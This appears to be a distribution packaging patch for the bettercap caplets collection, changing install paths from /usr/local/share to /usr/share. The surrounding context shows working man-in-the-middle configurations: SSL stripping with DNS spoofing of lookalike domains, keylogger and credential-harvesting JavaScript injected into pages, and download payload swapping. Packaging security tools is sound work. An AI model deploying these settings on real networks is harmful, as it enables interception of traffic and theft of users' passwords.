Author: Kevin Chevreuil - Kaisen <kaisen@kaisen-linux.org>

--- bettercap-caplets-0+git20200413.orig/download-autopwn/README.md
+++ bettercap-caplets-0+git20200413/download-autopwn/README.md
@@ -144,7 +144,7 @@ function onResponse(req, res) {
 						// Check requested file size
 						requestedFile = res.ReadBody()
 						requestedFileSize = requestedFile.length
-						payload = readFile("/usr/local/share/bettercap/caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
+						payload = readFile("/usr/share/bettercap/caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
 						payloadSize = payload.length
 						logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes" + 
 						          redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes" + redLine
--- bettercap-caplets-0+git20200413.orig/hstshijack/README.md
+++ bettercap-caplets-0+git20200413/hstshijack/README.md
@@ -5,16 +5,16 @@
 ### Caplet
 
 ```sh
-set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
 set hstshijack.ignore          *
 set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
 set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
 #set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
 set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq
 
 http.proxy  on
@@ -36,7 +36,7 @@ You can also inject your own JavaScript
 Example:
 
 ```sh
-hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+hstshijack.payloads *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js
 ```
 
 Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
--- bettercap-caplets-0+git20200413.orig/hstshijack/hstshijack.cap
+++ bettercap-caplets-0+git20200413/hstshijack/hstshijack.cap
@@ -1,15 +1,15 @@
 # Documentation can be found at https://github.com/bettercap/caplets/blob/master/hstshijack/README.md
 
-set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
 set hstshijack.ignore          *
 set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
 set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
 #set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/firefox-bypass-password-warning.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/firefox-bypass-password-warning.js,*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
 set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq
 
 http.proxy  on
--- bettercap-caplets-0+git20200413.orig/http-ui.cap
+++ bettercap-caplets-0+git20200413/http-ui.cap
@@ -4,7 +4,7 @@ set api.rest.port 8081
 set http.server.address 127.0.0.1
 set http.server.port 80
 # default installation path of the ui
-set http.server.path /usr/local/share/bettercap/ui
+set http.server.path /usr/share/bettercap/ui
 
 # !!! CHANGE THESE !!!
 set api.rest.username user
--- bettercap-caplets-0+git20200413.orig/https-ui.cap
+++ bettercap-caplets-0+git20200413/https-ui.cap
@@ -10,7 +10,7 @@ set https.server.key ~/.bettercap-https.
 set api.rest.certificate ~/.bettercap-https.cert.pem
 set api.rest.key ~/.bettercap-https.key.pem 
 # default installation path of the ui
-set https.server.path /usr/local/share/bettercap/ui
+set https.server.path /usr/share/bettercap/ui
 
 # !!! CHANGE THESE !!!
 set api.rest.username user
--- bettercap-caplets-0+git20200413.orig/login-manager-abuse/login-man-abuse.js
+++ bettercap-caplets-0+git20200413/login-manager-abuse/login-man-abuse.js
@@ -1,5 +1,5 @@
 /*
- * Ref. 
+ * Ref.
  *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72
  *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/
  *
@@ -13,7 +13,7 @@ var AbuserJavascript = "";
 
 function onLoad() {
     // log( "Loading abuser code from login-man-abuser.js" );
-    AbuserJavascript = readFile("/usr/local/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js")
+    AbuserJavascript = readFile("/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js")
 }
 
 // here we intercept the ajax POST request with leaked credentials.
@@ -39,13 +39,13 @@ function onResponse(req, res) {
     if( res.ContentType.indexOf('text/html') == 0 ){
         var body = res.ReadBody();
         if( body.indexOf('</head>') != -1 ) {
-            res.Body = body.replace( 
-                '</head>', 
+            res.Body = body.replace(
+                '</head>',
                 '<script type="text/javascript">' + "\n" +
                     AbuserJavascript +
                 '</script>' +
                 '</head>'
-            ); 
+            );
         }
     }
 }
--- bettercap-caplets-0+git20200413.orig/pwnagotchi-manual.cap
+++ bettercap-caplets-0+git20200413/pwnagotchi-manual.cap
@@ -6,7 +6,7 @@ set api.rest.address 0.0.0.0
 set api.rest.port 8081
 set http.server.address 0.0.0.0
 set http.server.port 80
-set http.server.path /usr/local/share/bettercap/ui
+set http.server.path /usr/share/bettercap/ui
 set api.rest.username pwnagotchi
 set api.rest.password pwnagotchi
 set api.rest.websocket true
--- bettercap-caplets-0+git20200413.orig/rtfm/rtfm.js
+++ bettercap-caplets-0+git20200413/rtfm/rtfm.js
@@ -18,7 +18,7 @@ function onResponse(req, res) {
         }
         res.SetHeader("Connection", "close");
         res.Status  = 200;
-        res.Body    = readFile("/usr/local/share/bettercap/caplets/www/rtfm_cat.jpg");
+        res.Body    = readFile("/usr/share/bettercap/caplets/www/rtfm_cat.jpg");
         log("RTFM! " + req.Hostname + req.Path + ( req.Query ? "?" + req.Query : ''));
     }
 }
--- bettercap-caplets-0+git20200413.orig/web-override/web-override.js
+++ bettercap-caplets-0+git20200413/web-override/web-override.js
@@ -1,4 +1,4 @@
-// Called before every request is executed, just override the response with 
+// Called before every request is executed, just override the response with
 // our own html web page.
 function onRequest(req, res) {
     headers = res.Headers.split("\r\n");
@@ -9,5 +9,5 @@ function onRequest(req, res) {
     res.SetHeader("Connection", "close");
     res.Status      = 200;
     res.ContentType = "text/html";
-    res.Body        =  readFile("/usr/local/share/bettercap/caplets/www/index.html");
+    res.Body        =  readFile("/usr/share/bettercap/caplets/www/index.html");
 }
